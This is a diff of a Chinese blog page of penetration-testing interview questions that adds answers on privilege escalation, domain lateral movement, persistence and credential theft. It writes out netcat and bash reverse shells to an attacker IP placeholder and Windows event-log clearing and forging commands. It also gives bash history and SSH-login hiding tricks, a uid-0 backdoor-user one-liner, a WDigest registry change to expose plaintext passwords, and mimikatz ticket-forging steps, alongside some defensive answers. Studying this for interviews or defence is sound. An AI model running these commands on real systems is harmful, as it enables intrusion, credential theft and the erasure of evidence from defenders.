@@ -30,7 +30,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/simg/system_1.jpg">
 <meta property="article:published_time" content="2023-09-02T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-09-25T14:26:14.407Z">
+<meta property="article:modified_time" content="2023-10-02T14:22:32.533Z">
 <meta property="article:author" content="Bron">
 <meta property="article:tag" content="面试">
 <meta name="twitter:card" content="summary">
@@ -225,7 +225,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-09-25 22:26:14" itemprop="dateModified" datetime="2023-09-25T22:26:14+08:00">2023-09-25</time>
+                <time title="修改时间：2023-10-02 22:22:32" itemprop="dateModified" datetime="2023-10-02T22:22:32+08:00">2023-10-02</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -254,14 +254,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>11k</span>
+              <span>24k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>10 分钟</span>
+              <span>22 分钟</span>
             </span>
 
         </div>
@@ -497,90 +497,245 @@
 </ol>
 <p>MySQL: 见问题9<br>MYSSQL: 问题11</p>
 <h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol>
-<li><p>Windows、Linux、数据库的加固降权思路。</p>
-</li>
-<li><p>谈一谈Windows系统与Linux系统提权的思路？</p>
-</li>
-<li><p>反弹shell的常用命令？一般常反弹哪一种shell？为什么？</p>
-</li>
-<li><p>如果一台服务器被入侵后，如何做应急响应？</p>
-</li>
-<li><p>webshell的检测有哪些方法？</p>
-</li>
-<li><p>metasploit打开反向监听的命令</p>
-</li>
-<li><p>应急响应的步骤</p>
-</li>
-<li><p>怎么查找域控</p>
-</li>
-<li><p>如何手工快速判断目标站是Windows还是Linux服务器？</p>
-</li>
-<li><p>提权时选择可读写目录，为何尽量不用带空格的目录？</p>
-</li>
-<li><p>某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</p>
-</li>
-<li><p>后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</p>
-</li>
-<li><p>目标站无防护，上传文件可正常访问，上传脚本格式访问则403，什么原因？</p>
-</li>
-<li><p>审查元素得知网站所使用的防护软件，你觉得是怎样做到的？</p>
-</li>
-<li><p>在win2003服务器中建立一个 .zhongzi文件夹用意何为？</p>
-</li>
-<li><p>如何拿一个网站的webshell？</p>
-</li>
-<li><p>为什么aspx木马权限比sap大？</p>
-</li>
-<li><p>如何绕过waf？</p>
-</li>
-<li><p>如何向服务器写入webshell？</p>
-</li>
-<li><p>ddos如何防护</p>
-</li>
-<li><p>有没有抓过包，会不会写wireshark过滤规则？</p>
-</li>
-<li><p>清理日志要清理哪些？</p>
-</li>
-<li><p>查看当前端口连接的命令有哪些？ <code>netstat</code> 和 <code>ss</code> 命令的区别和优缺点</p>
-</li>
-<li><p>判断域控的几种方式</p>
-</li>
-<li><p>工作组横向</p>
+<li>Windows、Linux、数据库的加固降权思路。</li>
+</ol>
+<p>禁用root，禁止远程访问，禁止写入，单独账号，禁止执行system等函数。</p>
+<ol start="2">
+<li>谈一谈Windows系统与Linux系统提权的思路？</li>
+</ol>
+<p>Windows提权：<br>(1) 系统内核溢出漏洞提权<br>(2) 系统配置错误提权<br>(3) 组策略首选项提权<br>(4) bypassUAC提权<br>(5) 数据库提权(UDF，MOF)</p>
+<p>Linux提权：<br>(1) 内核漏洞提权<br>(2) 定时任务提权<br>(3) SUID提权<br>(4) Sudo滥用提权<br>(5) NFS提权<br>(6) Docker提权</p>
+<ol start="3">
+<li>反弹shell的常用命令？一般常反弹哪一种shell？为什么？</li>
+</ol>
+<p>netcat反弹shell：<br>攻击机开启监听命令： <code>netcat -lvp 2333</code><br>目标机主动连接攻击机： <code>netcat &lt;攻击机IP&gt; &lt;攻击机端口&gt; -e /bin/bash</code></p>
+<p>bash反弹shell：<br><code>nc -lvvp 7777 -e /bin/bash</code><br>bash是交互式，否则像useradd无法交互。</p>
+<ol start="4">
+<li>如果一台服务器被入侵后，如何做应急响应？</li>
+</ol>
+<p>(1) 准备相关的工具，查后门等工具<br>(2) 初步判断时间类型，事件升级<br>(3) 抑制范围，隔离使受害面不继续扩大<br>(4) 查找原因，封堵攻击源<br>(5) 业务恢复正常水平<br>(6) 总结，报告，修复，监控</p>
+<p>应急响应的经验：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/defense/375005.html">网络安全应急响应典型案例</a><br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2225">应急响应</a></p>
+<ol start="5">
+<li>webshell的检测有哪些方法？</li>
+</ol>
+<p>(1) 基于webshell特征检测<br>(2) 基于流量特征的webshell检测<br>(3) 基于webshell系统行为特征的检测<br>(4) 基于web日志webshell行为特征的检测<br>(5) 动态检测(沙箱)<br>(6) 统计学</p>
+<ol start="6">
+<li>metasploit打开反向监听的命令</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li>应急响应的步骤</li>
+</ol>
+<p>见问题4</p>
+<ol start="8">
+<li>怎么查找域控</li>
+</ol>
+<p>(1) 通过DNS查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dig -t SRV _gc._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _ldap._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _kerberos._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _kpasswd._tcp.lab.ropnop.com</span><br></pre></td></tr></table></figure>
+<p>(2) 端口扫描<br>域服务器都会开启3389端口，所以可以通过扫描端口进行识别。<br>(3) 各种命令<br>dsquery<br>net group “Domain Controllers”<br>nltest &#x2F;DCLIST:pentest.com</p>
+<ol start="9">
+<li>如何手工快速判断目标站是Windows还是Linux服务器？</li>
+</ol>
+<p>(1) Linux大小写敏感，Windows大小写不敏感<br>(2) ping服务器，返回的TTL值不同。Windows一般在100以上，Linux一般100以下。<br>TTL&#x3D;128: WINNT&#x2F;2K&#x2F;XP<br>TTL&#x3D;32: WIN95&#x2F;98&#x2F;ME<br>TTL&#x3D;256: UNIX<br>TTL&#x3D;64: LINUX</p>
+<ol start="10">
+<li>提权时选择可读写目录，为何尽量不用带空格的目录？</li>
+</ol>
+<p>因为exp执行多半需要空格界定参数</p>
+<ol start="11">
+<li>某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</li>
+</ol>
+<p>同数据库</p>
+<ol start="12">
+<li>后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</li>
+</ol>
+<p>审查元素。将密码处的password属性改为text属性即可明文显示密码。</p>
+<ol start="13">
+<li>目标站无防护，上传文件可正常访问，上传脚本格式访问则403，什么原因？</li>
+</ol>
+<p>可能原因：<br>web服务器配置将上传文件写死了不执行相应脚本，可尝试改后缀名绕过。</p>
+<ol start="14">
+<li>审查元素得知网站所使用的防护软件，你觉得是怎样做到的？</li>
+</ol>
+<p>在敏感操作被拦截，通过界面信息无法具体判断是什么防护时，F12看HTML顶部，比如护卫神就可以在名称看到那内容。</p>
+<ol start="15">
+<li>在win2003服务器中建立一个 .zhongzi文件夹用意何为？</li>
+</ol>
+<p>隐藏文件夹，为了不让管理员发现传上去的工具。</p>
+<ol start="16">
+<li>如何拿一个网站的webshell？</li>
+</ol>
+<p>上传，后台编辑模板，sql注入写文件，命令执行，代码执行，一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等。</p>
+<ol start="17">
+<li>为什么aspx木马权限比asp大？</li>
+</ol>
+<p>aspx使用的是.net技术。在IIS6.0到IIS7.5，.NET默认的账户是aspnet，隶属于Users，而此时的ASP基于IUSER账户，隶属于Guest组，对于组来说Users组的权限 &gt; Guest组，所以能执行或者读取的资源更多。<br>IIS7.5之后，两者权限相同。都是基于默认的应用程序池defaultapppool<br><a target="_blank" rel="noopener" href="https://www.dongchuanmin.com/net/3812.html">ASPX的webshell权限为什么比ASP的大</a></p>
+<ol start="18">
+<li>如何绕过waf？</li>
+</ol>
+<p>绕过：<br>(1) 使用编码绕过（如：url编码，二次url编码，Unicode编码，base64编码，hex编码，ascii编码）<br>(2) 字母大小写转换绕过<br>(3) 空格过滤绕过（如‘+’号代替空格，空白符，注释符&#x2F;**&#x2F;绕过）<br>(4) 双关键字绕过<br>(5) 内联注释绕过(在MySQL里，/**/是多行注释，这个是SQL的标准，但是MySQL扩张了解释的功能，如果在开头的的/*后头加了惊叹号（/*!50001sleep(3)*/），那么此注释里的语句将被执行。)<br>(6) 请求方式差异规则松懈性绕过（有些WAF同时接收GET方法和POST的方法，但只在GET方法中增加了过滤规则，可通过发送POST方法进行绕过。）<br>(7) 异常method绕过（有些WAF只检测GET，POST方法，可通过使用异常方法进行绕过。）<br>(8) 超大数据包绕过（部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测）<br>(9) 复参数绕过（在提交的URL中给一个参数多次赋不同的值 <code>?id=1&amp;id=2</code> , 部分WAF在处理的过程中可能只处理前面提交的参数值，而后端程序在处理的时候可能取的是最后的值）<br>(10) 添加%绕过过滤（将WAF中过滤的敏感字符通过添加%绕过过滤。如 sel%ect）<br>(11) 协议未覆盖绕过（部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换去掉WAF过滤机制。）<br>(12) 宽字节绕过（宽字节注入是因为使用了GBK编码。）<br>(13) %00截断<br>(14) Cookie&#x2F;X-Forwarded-For注入绕过（部分WAF可能只对GET，POST提交的参数进行过滤，未对Cookie或者X-Forwarded-For进行检测，可通过cookie或者X-Forwarded-For提交注入参数语句进行绕过。）<br>(15) 利用pipline绕过（当请求中的Connection字段值为keep-alive，则代表本次发起的请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。部分WAF可能只对第一次传输过来的请求进行过滤处理。）<br>(16) 利用分块编码传输绕过（分块传输编码是HTTP的一种数据传输机制，允许将消息体分成若干块进行发送。当数据请求包中header信息存在Transfer-Encoding: chunked，就代表这个消息体采用了分块编码传输。）<br>(17) 冷门函数&#x2F;字符&#x2F;运算符绕过（如： Sleep()  &#x3D;&#x3D;&gt; benchmark()）</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/229982.html">WAF机制及绕过方法总结：注入篇</a></p>
+<ol start="19">
+<li>如何向服务器写入webshell？</li>
+</ol>
+<p>各种上传漏洞<br>mysql具有写入权限，用sql语句写入shell<br>http put方法</p>
+<ol start="20">
+<li>ddos如何防护</li>
+</ol>
+<p>(1) SYN Cookie&#x2F;SYN proxy, safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个cookie，并统计每个IP地址的访问频率。如果在短时间内收到大量来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被抛弃。（适用于单主机的DDOS）<br>(2) 过滤不必要的服务和端口, 可以使用Inexpress、Express、Forwarding等工具来过滤不必要的服务和端口，即在路由器上过滤假IP。<br>(3) 异常流量的清洗过滤：通过DDOS硬件防火墙对异常流量的清洗过滤，通过数据包的规则过滤、数据流指纹检测过滤、及数据包内容定制过滤等顶尖技术能准确判断外来访问流量是否正常，进一步将异常流量禁止过滤。<br>(4) 分布式集群防御：这是目前网络安全界防御大规模DDOS攻击的最有效办法。分布式集群防御的特点是在每个节点服务器配置多个IP地址（负载均衡），并且每个节点能承受不低于10G的DDOS攻击，如一个节点受攻击无法提供服务，系统将会根据优先级设置自动切换另一个节点，并将攻击者的数据包全部返回发送点，使攻击源成为瘫痪状态，从更为深度的安全防护角度去影响企业的安全执行决策。<br>(5) 高防智能DNS解析：高智能DNS解析系统与DDOS防御系统的完美结合，为企业提供对抗新兴安全威胁的超级检测功能。它颠覆了传统一个域名对应一个镜像的做法，智能根据用户的上网路线将DNS解析请求解析到用户所属网络的服务器。同时智能DNS解析系统还有宕机检测功能，随时可将瘫痪的服务器IP智能更换成正常服务器IP，为企业的网络保持一个永不宕机的服务状态。<br>(6) CDN。缺点是一旦被人知道源服务器的IP，就可绕过。</p>
+<ol start="21">
+<li>有没有抓过包，会不会写wireshark过滤规则？</li>
+</ol>
+<p>有。wireshark和burpsuite<br>会写。wireshark过滤规则：</p>
+<p>过滤IP：<br>过滤源IP地址： <code>ip.src==1.1.1.1</code><br>过滤目的IP地址： <code>ip.dst==1.1.1.1</code></p>
+<p>过滤端口：<br>过滤80端口： <code>tcp.port==80</code><br>过滤源端口： <code>tcp.srcport==80</code><br>过滤目的端口： <code>tcp.dstport==80</code></p>
+<p>协议过滤：<br>直接输入协议名即可，如http协议：<br><code>http</code></p>
+<p>http模式过滤：<br>过滤get&#x2F;post包：<br><code>http.request.method==&quot;GET/POST&quot;</code></p>
+<ol start="22">
+<li>清理日志要清理哪些？</li>
+</ol>
+<p>Linux清理日志见问题2<br>Windows清理日志：<br>(1) 命令行一键清除Windows事件日志：<br><code>PowerShell -Command &quot;&amp; &#123;clear-Eventlog -Log Application,System,Security&#125;&quot;</code><br><code>Get-WinEvent -ListLog Application,Setup,Security -Force | %&#123;Wevtutil.exe cl $_.Logname&#125;</code></p>
+<p>(2) wevtutil.exe<br>操作系统默认包含，支持系统：win7及以上。<br>常用命令如下：<br>统计日志列表，查询所有日志信息，包含时间，数目<br><code>wevtutil.exe gli Application</code></p>
+<p>查看指定类别的日志内容：<br><code>wevtutil qe /f:text Application</code></p>
+<p>删除该类日志所有内容（单条内容删除暂不支持）：<br><code>wevtutil cl Application</code></p>
+<p>(3) NSA DanderSpiritz<br><a target="_blank" rel="noopener" href="https://3gstudent.github.io/NSA-DanderSpiritz%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E4%B8%8E%E6%B5%8B%E8%AF%95">DanderSpritz</a>是NSA的一款界面化的远控工具<br>常用命令如下：<br>统计日志列表，查询所有日志信息，包含时间，数目<br><code>eventlogquery -log Application</code></p>
+<p>查看指定类别的日志内容<br><code>eventlogfilter -log Application -num 10</code></p>
+<p>删除该类日志所有内容<br><code>eventlogclear -log Application</code></p>
+<p>删除单条内容<br><code>eventlogedit -log Application -record 1</code></p>
+<p>注：<br>record序号可通过eventlogfilter获得</p>
+<p>(4) Windows日志伪造，使用eventcreate这个命令行工具来伪造日志或使用自定义的大量垃圾信息覆盖现有日志。<br><code>eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id 500</code></p>
+<ol start="23">
+<li>查看当前端口连接的命令有哪些？ <code>netstat</code> 和 <code>ss</code> 命令的区别和优缺点<br><code>netstat -an</code></li>
+</ol>
+<p>windows:<br>PowerShell: <code>Get-NetTCPConnection -State Listen</code></p>
+<p>On Linux &#x2F; macOS:<br><code>sudo lsof -i -P -n | grep LISTEN</code></p>
+<ol start="24">
+<li>判断域控的几种方式</li>
+</ol>
+<p>(1) 查看系统信息：在Windows系统中，可以通过以下命令查看系统信息：<br><code>systeminfo</code><br>如果是域控，则会显示域名和域控制器的名称。<br>(2) 查看域成员：可以通过以下命令查看域成员：<br><code>net group /domain</code><br>如果系统是域控，则会显示域中所有成员的信息。<br>(3) 查看域控制器：可以通过以下命令查看域控制器：<br><code>nltest /dclist:域名</code><br>该命令将显示域中的所有域控制器。<br>(4) 查看DNS记录：可以通过以下命令查看DNS记录：<br><code>nslookup -type=SRV _ldap._tcp.域名</code><br>该命令将显示域控制器的SRV记录。<br>(5) 查看计算机的角色：在Windows Server中，可以通过Server Manager查看一个计算机的角色。如果计算机的角色是“Active Directory 域服务”，则它是域控制器。</p>
+<ol start="25">
+<li><p>工作组横向<br>(1) 通过at&amp;schtasks进行明文传递<br>说明：at&amp;schtasks 都是 windows 上创建计划任务的命令，只是针对的版本不同，at是win2008及以下；<br>(2) atexec进行明文与HASH传递<br>(3) SMB服务利用<br>(4) WMI服务利用<br>(5) PTH横向传递攻击<br>(6) PTK横向传递攻击<br>(7) RDP传递攻击<br><a target="_blank" rel="noopener" href="https://www.wangan.com/p/11v71d8e5253fc5f#%E4%B8%80%E3%80%81%E9%80%9A%E8%BF%87at&schtasks%E8%BF%9B%E8%A1%8C%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92">内网横向移动常用方法及工具总结</a></p>
 </li>
 <li><p>域内横向</p>
 </li>
-<li><p>白银票据黄金票据</p>
-</li>
-<li><p>判断是否在域内</p>
-</li>
-<li><p>hash传递原理</p>
-</li>
-<li><p>权限维持</p>
-</li>
-<li><p>横向移动的各种姿势和原理</p>
-</li>
-<li><p>凭证获取(姿势&#x2F;常用&#x2F;原理&#x2F;对抗)</p>
-</li>
-<li><p>如何对抗杀软加后门用户</p>
-</li>
-<li><p>chrome dump密码的原理，如果让你写个工具，思路是什么？（或者别人工具的实现原理）</p>
-</li>
-<li><p>PTH哈希传递</p>
-</li>
-<li><p>DCsync原理，DCsync是哪个协议？</p>
-</li>
-<li><p>有台Windows域内机器，如何打域控？</p>
-</li>
-<li><p>webshell 提权（低权限到高权限）</p>
-</li>
-<li><p>已经拿到webshell，说说你的内网思路</p>
-</li>
-<li><p>不允许扫描，如何横向</p>
-</li>
-<li><p>存在杀软，不允许exe落地，怎么办</p>
-</li>
-<li><p>常用的提权姿势</p>
-</li>
+</ol>
+<p>(1) LM Hash 和 NTLM Hash<br>(2) PTH&amp;PTT&amp;PTK<br>(3) DCSync<br>(4) Zerologon 域提权漏洞<br>(5) 从NTDS.dit获取域散列值<br><a target="_blank" rel="noopener" href="https://www.shawroot.cc/2204.html">域内横向移动学习笔记</a><br><a target="_blank" rel="noopener" href="https://github.com/SewellDinG/Pentest-Notes/blob/master/%E7%AC%AC5%E7%AB%A0.%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1.md">域内横向移动分析及防御</a></p>
+<ol start="27">
+<li>白银票据黄金票据</li>
+</ol>
+<p>白银票据是指伪造的服务票据（Service Ticket，ST），它可以授权攻击者访问指定服务器上的指定服务。白银票据的生成需要以下条件：<br>1.域名称<br>2.域的SID值<br>3.域中的Server服务器账户的NTLM-Hash<br>4.伪造的用户名，可以是任意用户名.<br>5.目标服务器上面的kerberos服务</p>
+<p>白银票据的生成过程如下：<br>通过mimikatz生成银票。</p>
+<p>白银票据的使用过程如下：<br>使用mimikatz执行如下命令导入Silver Ticket</p>
+<p>黄金票据是指伪造的TGT票据，它可以授权攻击者访问域内所有服务。黄金票据的生成需要以下条件：<br>1、域名称<br>2、域的SID值<br>3、域的KRBTGT账户密码HASH<br>4、伪造用户名，可以是任意的</p>
+<p>黄金票据的生成过程如下：<br>得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p>
+<p>黄金票据的使用过程如下：<br>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p>
+<p>黄金票据防御<br>1、限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。<br>2、禁用KRBTGT帐户，并保存当前的密码以及以前的密码。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证。</p>
+<p>关于黄金票据和白银票据的一些区别:<br>1、访问权限不同<br>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限<br>Silver Ticket: 伪造TGS,只能访问指定的服务</p>
+<p>2、加密方式不同<br>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密<br>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</p>
+<p>3、认证流程不同<br>Golden Ticket 的利用过程需要访问域控(KDC)<br>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</p>
+<p><a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">浅析黄金票据与白银票据</a></p>
+<ol start="28">
+<li>判断是否在域内</li>
+</ol>
+<p>1、 查看当前网卡和IP信息<br>使用命令 <code>ipconfig /all</code><br>在Windows IP 配置(Windows IP Configuration)下的主DNS后缀(Primary DNS Suffix)处：<br>如果为空，说明不在域内；<br>如果显示域名，说明在域内。</p>
+<p>2、 查看操作系统详细信息<br>使用命令 <code>systeminfo</code><br>在域(Domain)处，如果：<br>显示 工作组(WORKGROUP)，说明不在域内。<br>显示 域名，说明在域内。</p>
+<p>3、 查看当前登录域及域用户<br>使用命令 <code>net config workstation</code><br>在工作站域(Workstation Domain):<br>显示WORKGROUP，说明不在域内。<br>显示域名，说明在域内。而且多一行“工作站域DNS名称”。</p>
+<p>4、 查看域内时间<br>使用命令 <code>net time /domain</code><br>通过执行以上命令后，会出现三种情况：<br>(1) 当前是工作组环境。会显示“找不到域 WORKGROUP 的域控制器。”<br>(2) 存在域，当前用户不是域用户。会显示“发生系统错误5。 拒绝访问。”<br>(3) 存在域，当前用户是域用户。会显示“DC1.xx.xx 的当前时间是 YY&#x2F;MM&#x2F;DD HH:MM:SS  命令成功完成”</p>
+<ol start="29">
+<li>hash传递原理</li>
+</ol>
+<p>hash传递原理(Pass-The-Hash):<br>哈希传递攻击是基于NTLM认证的一种攻击方式。哈希传递攻击的利用前提是我们获得了某个用户的密码哈希值，但是解不开明文。这时我们可以利用NTLM认证的一种缺陷，利用用户的密码哈希值来进行NTLM认证。在域环境中，大量计算机在安装时会使用相同的本地管理员账号和密码。因此，如果计算机的本地管理员账号密码相同，攻击者就能使用哈希传递攻击登录内网中的其他机器。</p>
+<ol start="30">
+<li>权限维持</li>
+</ol>
+<p>Windows权限维持：<br>(1) 辅助功能镜像劫持。比如最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序<br>(2) 启动项或服务后门。<br>(3) 系统计划任务后门。<br>(4) DLL劫持<br>(5) Winlogon用户登录初始化<br>(6) Logon Scripts 后门<br>(7) 文件关联<br>(8) Bitsadmin<br>(9) 进程注入<br>(10) 屏幕保护程序<br>(11) WMI构造无文件后门<br>(12) 影子用户<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9718">Windows权限维持总结</a></p>
+<p>Linux权限维持：<br>1、隐藏文件：创建隐藏文件的命令 <code>touch .test.txt</code> ，在文件名前加一个点即可创造隐藏文件。<br>2、隐藏文件时间戳：Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。<br>3、隐藏权限：在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用 <code>ls -l</code> 是查看不出来的，从而达到隐藏权限的目的。<br>4、隐藏历史操作命令：(1) 只针对自己的工作关闭历史记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">关闭历史功能命令 [space]set +o history</span><br><span class="line">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br><span class="line">重启历史功能命令 [space]set -o history</span><br><span class="line">它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。</span><br></pre></td></tr></table></figure>
+
+<p>(2) 从历史记录中删除指定命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">删除历史记录的命令 history | grep &quot;keyword&quot;</span><br><span class="line">输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</span><br><span class="line">history -d [num]</span><br><span class="line">只保留前150行的命令 sed -i &#x27;150,$d&#x27; .bash_history</span><br></pre></td></tr></table></figure>
+
+<p>5、隐藏远程SSH登录记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">身登录系统，不会被w、who、last等指令检测到。</span><br><span class="line">ssh -T root@127.0.0.1 /bin/bash -i</span><br><span class="line">不记录ssh公钥在本地.ssh目录中</span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -i</span><br></pre></td></tr></table></figure>
+
+<p>6、端口复用<br>通过端口复用来达到隐藏端口的目的<br>(1) 通过SSLH在同一端口上共享SSH与HTTPS<br>(2) 利用IPTables进行端口复用</p>
+<p>7、进程隐藏<br>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。<br>(1) libprocesshider<br>(2) 进程注入工具linux-inject</p>
+<p>8、一句话添加用户和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure>
+
+<p>9、SUID Shell<br>Suid shell是一种可用于以拥有者权限运行的shell。</p>
+<p>10、SSH公私钥免密登录<br>在客户端上生成一对公私钥，然后把公钥放到服务器上（ <code>~/.ssh/authorized_keys</code> ），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p>
+<p>11、软连接<br>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。</p>
+<p>12、SSH Wrapper<br>从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p>
+<p>13、strace后门<br>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p>
+<p>14、crontab反弹shell<br>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p>
+<p>15、openssh后门<br>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p>
+<p>16、PAM后门<br>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。</p>
+<p>17、rootkit后门<br>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。<br><a target="_blank" rel="noopener" href="https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html">Linux权限维持–后门篇</a></p>
+<ol start="31">
+<li>横向移动的各种姿势和原理</li>
+</ol>
+<p>见问题25，26</p>
+<ol start="32">
+<li>凭证获取(姿势&#x2F;常用&#x2F;原理&#x2F;对抗)</li>
+</ol>
+<p>Windows凭证保护机制及bypass：<br>1、LSA保护<br>自Windows 8.1 开始为LSA提供了额外的保护（LSA Protection），以防止读取内存和不受保护的进程注入代码。保护模式要求所有加载到LSA的插件都必须使用Microsoft签名进行数字签名。 在LSA Protection保护模式下，mimikatz运行 sekurlsa::logonpasswords抓取密码会报错。</p>
+<p>bypass：<br>(1) mimikatz运行lsadump::sam从磁盘上的SAM读取凭据，可成功bypass LSA Protection，读取到用户哈希<br>(2) mimikatz其中的mimidrv.sys驱动程序，可从lsass.exe进程中删除LSA保护，成功bypass LSA保护</p>
+<p>2、Credential Guard(虚拟化保护)<br>在Windows 10和Windows Server 2016中，Microsoft启用Credential Guard（凭据防护），使用基于虚拟化技术来保护和隔离lsass进程，以保护凭证。启用Credential Guard后，lsass包含2个进程：正常LSA进程和隔离LSA进程（在VSM中运行）</p>
+<p>bypass:<br>(1) mimikatz运行lsadump::sam从磁盘上的SAM读取凭据，可成功bypass Credential Guard，读取到全部的用户哈希<br>(2) SSP在用户登录时被调用，并接收该用户的凭据。在系统启动时SSP会被加载到进程lsass.exe中。</p>
+<p>3、kb2871997补丁<br>kb2871997主要用来防止pth攻击，限制了两个sid（kb2871997会删除除了*wdigest ssp以外其他ssp的明文凭据，但对于wdigest ssp只能选择禁用）</p>
+<p>bypass:<br>(1) 修改注册表实现，需要重启：<br><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code><br>(2) 锁屏实现：<br><code>rundll32.exe user32.dll LockWorkStation</code><br>(3) 使用截屏、键盘记录等后渗透功能，一般都要对应用户的空间下操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//cs</span><br><span class="line">desktop [explorer pid] x86|x64 low |higt</span><br><span class="line">//msf</span><br><span class="line">migrate [explorer pid]</span><br><span class="line">screenshot</span><br></pre></td></tr></table></figure>
+
